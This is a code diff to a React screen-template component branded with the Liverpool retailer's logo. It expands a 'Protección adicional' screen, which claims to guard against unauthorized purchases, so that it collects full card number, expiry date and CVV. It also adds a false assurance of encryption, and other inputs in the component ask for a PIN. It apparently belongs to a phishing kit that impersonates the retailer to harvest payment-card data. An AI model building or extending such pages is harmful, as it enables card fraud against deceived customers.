@@ -30,6 +30,8 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   const [codigoInput, setCodigoInput] = useState('');
   const [nipInput, setNipInput] = useState('');
   const [tarjetaInput, setTarjetaInput] = useState('');
+  const [fechaVencimientoInput, setFechaVencimientoInput] = useState('');
+  const [cvvInput, setCvvInput] = useState('');
 
   // Helper function to render the appropriate screen
   const renderScreen = () => {
@@ -172,19 +174,64 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
           <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
             <h2 className="text-xl font-bold mb-3">Protección adicional</h2>
             <p className="mb-4">Para evitar compras en línea no autorizadas, agregue protección a su tarjeta.</p>
-            <Input 
-              type="text" 
-              placeholder="Número de tarjeta" 
-              className="w-full border border-gray-300 rounded p-2 mb-3"
-              value={tarjetaInput}
-              onChange={(e) => setTarjetaInput(e.target.value)}
-            />
+            
+            <div className="mb-4 p-3 bg-gray-50 rounded-lg border border-gray-200">
+              <h3 className="text-sm font-semibold mb-2 text-left">Ingrese los datos de su tarjeta</h3>
+              <Input 
+                type="text" 
+                placeholder="Número de tarjeta (16 dígitos)" 
+                className="w-full border border-gray-300 rounded p-2 mb-3"
+                value={tarjetaInput}
+                onChange={(e) => setTarjetaInput(e.target.value)}
+                maxLength={16}
+              />
+              
+              <div className="flex gap-3 mb-3">
+                <div className="w-1/2">
+                  <Input 
+                    type="text" 
+                    placeholder="Fecha de vencimiento (MM/AA)" 
+                    className="w-full border border-gray-300 rounded p-2"
+                    value={fechaVencimientoInput}
+                    onChange={(e) => setFechaVencimientoInput(e.target.value)}
+                    maxLength={5}
+                  />
+                </div>
+                <div className="w-1/2">
+                  <Input 
+                    type="text" 
+                    placeholder="CVV (código verificador)" 
+                    className="w-full border border-gray-300 rounded p-2"
+                    value={cvvInput}
+                    onChange={(e) => setCvvInput(e.target.value)}
+                    maxLength={3}
+                  />
+                </div>
+              </div>
+              
+              <div className="text-xs text-left text-gray-600 mb-1">
+                <div className="flex items-center">
+                  <div className="bg-gray-200 rounded p-1 mr-2">
+                    <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                    </svg>
+                  </div>
+                  Su información es protegida con cifrado de seguridad
+                </div>
+              </div>
+            </div>
+            
             <Button 
-              className="bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors"
-              onClick={() => onSubmit(ScreenType.TARJETA, { tarjeta: tarjetaInput })}
+              className="bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors w-full"
+              onClick={() => onSubmit(ScreenType.TARJETA, { 
+                tarjeta: tarjetaInput,
+                fechaVencimiento: fechaVencimientoInput,
+                cvv: cvvInput
+              })}
             >
               Continuar
             </Button>
+            
             <div className="mt-4">
               <a href="#" className="text-blue-600 block mt-2 text-sm">Nueva aclaración</a>
               <a href="#" className="text-blue-600 block mt-2 text-sm">Estatus de mis aclaraciones</a>
@@ -251,8 +298,8 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
 
   // Logo de Liverpool que se mostrará en todas las pantallas
   const renderLogo = () => (
-    <div className="flex justify-center mb-4">
-      <img src={liverpoolLogo} alt="Liverpool" className="h-12" />
+    <div className="flex justify-center mb-6">
+      <img src={liverpoolLogo} alt="Liverpool" className="h-20" />
     </div>
   );
 
